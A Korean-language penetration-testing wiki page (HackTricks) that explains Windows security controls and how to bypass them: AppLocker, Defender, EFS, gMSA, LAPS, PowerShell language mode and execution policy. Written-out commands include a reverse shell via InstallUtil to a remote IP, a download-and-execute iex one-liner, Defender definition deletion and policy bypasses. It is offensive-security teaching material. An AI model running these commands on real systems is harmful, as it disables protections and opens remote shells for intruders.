# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

애플리케이션 화이트리스트는 시스템에 존재하고 실행될 수 있는 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 환경을 유해한 맬웨어와 특정 조직의 비즈니스 요구에 맞지 않는 승인되지 않은 소프트웨어로부터 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **애플리케이션 화이트리스트 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션 및 파일**을 제어할 수 있게 해줍니다. 이는 실행 파일, 스크립트, Windows 설치 파일, DLL, 패키지 앱 및 패키지 앱 설치 프로그램에 대한 **세부적인 제어**를 제공합니다.\
조직에서는 **cmd.exe와 PowerShell.exe** 및 특정 디렉터리에 대한 쓰기 접근을 **차단하는 것이 일반적이지만**, 이는 모두 우회될 수 있습니다.

### Check

어떤 파일/확장자가 블랙리스트/화이트리스트에 있는지 확인하십시오:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로는 AppLocker에 의해 적용된 구성 및 정책을 포함하고 있으며, 시스템에서 시행되는 현재 규칙 집합을 검토할 수 있는 방법을 제공합니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### 우회

- AppLocker 정책을 우회하기 위한 유용한 **쓰기 가능한 폴더**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내의 모든 것을 실행하도록 허용하는 경우, 이를 **우회하기 위해 사용할 수 있는 **쓰기 가능한 폴더**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **신뢰할 수 있는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리는 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 규칙은 우회될 수 있습니다.**
- 예를 들어, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, 어디에나 **`allowed`**라는 **폴더를 생성하면** 허용됩니다.
- 조직은 종종 **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** 실행 파일을 **차단하는 데** 집중하지만, **다른** [**PowerShell 실행 파일 위치**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)인 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`를 잊어버립니다.
- **DLL 강제 적용은 시스템에 추가 부하를 줄 수 있기 때문에 매우 드물게 활성화됩니다.** 따라서 **백도어로서 DLL을 사용하는 것이 AppLocker를 우회하는 데 도움이 됩니다.**
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 **Powershell** 코드를 어떤 프로세스에서든 실행하고 AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## 자격 증명 저장소

### 보안 계정 관리자 (SAM)

로컬 자격 증명은 이 파일에 존재하며, 비밀번호는 해시 처리됩니다.

### 로컬 보안 권한 (LSA) - LSASS

**자격 증명**(해시 처리됨)은 **단일 로그인** 이유로 이 하위 시스템의 **메모리**에 **저장됩니다**.\
**LSA**는 로컬 **보안 정책**(비밀번호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 등을 관리합니다.\
LSA는 **SAM** 파일 내에서 제공된 자격 증명을 **확인**하고 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 **통신**합니다.

**자격 증명**은 **프로세스 LSASS** 내에 **저장됩니다**: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화된 비밀번호.

### LSA 비밀

LSA는 디스크에 일부 자격 증명을 저장할 수 있습니다:

- Active Directory의 컴퓨터 계정 비밀번호 (도달할 수 없는 도메인 컨트롤러).
- Windows 서비스 계정의 비밀번호
- 예약된 작업의 비밀번호
- 기타 (IIS 애플리케이션의 비밀번호...)

### NTDS.dit

Active Directory의 데이터베이스입니다. 도메인 컨트롤러에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11, 그리고 Windows Server 버전에서 사용할 수 있는 안티바이러스입니다. **일반적인** 펜테스팅 도구인 **`WinPEAS`**를 **차단합니다**. 그러나 이러한 보호를 **우회하는 방법이 있습니다.**

### 확인

**Defender**의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행할 수 있습니다(활성화 여부를 알기 위해 **`RealTimeProtectionEnabled`** 값을 확인하세요):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

열거하려면 다음을 실행할 수도 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS는 **대칭 키**인 **파일 암호화 키 (FEK)**를 사용하여 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때, 사용자의 디지털 인증서에 해당하는 **개인 키**를 사용하여 $EFS 스트림에서 FEK를 복호화합니다. 더 많은 세부정보는 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자 개입 없이 복호화되는 시나리오**는 다음과 같습니다:

- 파일이나 폴더가 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 비 EFS 파일 시스템으로 이동될 때, 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송된 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방법은 소유자에게 암호화된 파일에 대한 **투명한 접근**을 허용합니다. 그러나 소유자의 비밀번호를 단순히 변경하고 로그인하는 것만으로는 복호화가 허용되지 않습니다.

**주요 요점**:

- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화는 사용자의 개인 키를 사용하여 FEK에 접근합니다.
- FAT32로 복사하거나 네트워크 전송과 같은 특정 조건에서 자동 복호화가 발생합니다.
- 암호화된 파일은 추가 단계 없이 소유자가 접근할 수 있습니다.

### EFS 정보 확인

**사용자**가 이 **서비스**를 **사용했는지** 확인하려면 이 경로가 존재하는지 확인하세요: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

파일에 **접근**할 수 있는 **사람**을 확인하려면 `cipher /c \<file>\`를 사용하세요.  
폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화**하고 **복호화**할 수도 있습니다.

### EFS 파일 복호화

#### 권한 시스템이 되기

이 방법은 **피해자 사용자**가 호스트 내에서 **프로세스**를 **실행**하고 있어야 합니다. 그런 경우, `meterpreter` 세션을 사용하여 사용자의 프로세스 토큰을 가장할 수 있습니다 (`incognito`의 `impersonate_token`). 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호 알기

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 단순화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. 전통적인 서비스 계정은 종종 "**비밀번호 만료 안 함**" 설정이 활성화되어 있는 반면, gMSA는 보다 안전하고 관리하기 쉬운 솔루션을 제공합니다:

- **자동 비밀번호 관리**: gMSA는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경되는 복잡한 240자 비밀번호를 사용합니다. 이 과정은 Microsoft의 키 배포 서비스(KDC)가 처리하여 수동 비밀번호 업데이트의 필요성을 없앱니다.
- **강화된 보안**: 이러한 계정은 잠금에 면역이며 대화형 로그인을 위해 사용할 수 없어 보안을 강화합니다.
- **다중 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있어 여러 서버에서 실행되는 서비스에 적합합니다.
- **예약 작업 기능**: 관리 서비스 계정과 달리 gMSA는 예약 작업 실행을 지원합니다.
- **단순화된 SPN 관리**: 시스템은 컴퓨터의 sAMaccount 세부정보 또는 DNS 이름에 변경이 있을 때 자동으로 서비스 주체 이름(SPN)을 업데이트하여 SPN 관리를 단순화합니다.

gMSA의 비밀번호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 도메인 컨트롤러(DC)에 의해 30일마다 자동으로 재설정됩니다. 이 비밀번호는 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 데이터 블롭이며, 권한이 있는 관리자와 gMSA가 설치된 서버만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보를 접근하려면 LDAPS와 같은 보안 연결이 필요하거나 'Sealing & Secure'로 인증된 연결이어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

이 비밀번호는 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**로 읽을 수 있습니다:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**이 게시물에서 더 많은 정보를 찾으세요**](https://cube0x0.github.io/Relaying-for-gMSA/)

또한, **gMSA**의 **비밀번호**를 **읽기** 위한 **NTLM 릴레이 공격** 수행 방법에 대한 [웹 페이지](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.

## LAPS

**로컬 관리자 비밀번호 솔루션 (LAPS)**는 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있으며, 로컬 관리자 비밀번호 관리를 가능하게 합니다. 이 비밀번호는 **무작위화**되고, 고유하며, **정기적으로 변경**되며, Active Directory에 중앙 집중식으로 저장됩니다. 이러한 비밀번호에 대한 접근은 ACL을 통해 권한이 있는 사용자로 제한됩니다. 충분한 권한이 부여되면 로컬 관리자 비밀번호를 읽을 수 있는 기능이 제공됩니다.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS 제약 언어 모드

PowerShell [**제약 언어 모드**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 COM 객체 차단, 승인된 .NET 유형만 허용, XAML 기반 워크플로, PowerShell 클래스 등 PowerShell을 효과적으로 사용하기 위해 필요한 많은 기능을 **잠급니다**.

### **확인**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회
```powershell
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 이 우회 방법이 작동하지 않지만 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)를 사용할 수 있습니다.\
**컴파일하려면** **다음이 필요할 수 있습니다** **_참조 추가_** -> _찾아보기_ -> _찾아보기_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`를 추가하고 **프로젝트를 .Net4.5로 변경하십시오**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 리버스 셸:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)를 사용하여 **Powershell** 코드를 모든 프로세스에서 실행하고 제한된 모드를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS 실행 정책

기본적으로 **제한됨**으로 설정되어 있습니다. 이 정책을 우회하는 주요 방법:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
더 많은 내용은 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)에서 확인할 수 있습니다.

## 보안 지원 공급자 인터페이스 (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 통신을 원하는 두 머신에 적합한 프로토콜을 찾는 역할을 합니다. 이를 위한 선호 방법은 Kerberos입니다. 그런 다음 SSPI는 사용할 인증 프로토콜을 협상합니다. 이러한 인증 프로토콜은 보안 지원 공급자(SSP)라고 하며, 각 Windows 머신 내에서 DLL 형태로 존재하며 두 머신 모두 동일한 프로토콜을 지원해야 통신할 수 있습니다.

### 주요 SSP

- **Kerberos**: 선호되는 프로토콜
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성 이유
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: 웹 서버 및 LDAP, MD5 해시 형태의 비밀번호
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됩니다(기본값은 Kerberos인 Kerberos 또는 NTLM)
- %windir%\Windows\System32\lsasrv.dll

#### 협상은 여러 방법을 제공할 수 있거나 하나만 제공할 수 있습니다.

## UAC - 사용자 계정 컨트롤

[사용자 계정 컨트롤 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **승격된 활동에 대한 동의 프롬프트**를 활성화하는 기능입니다.

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
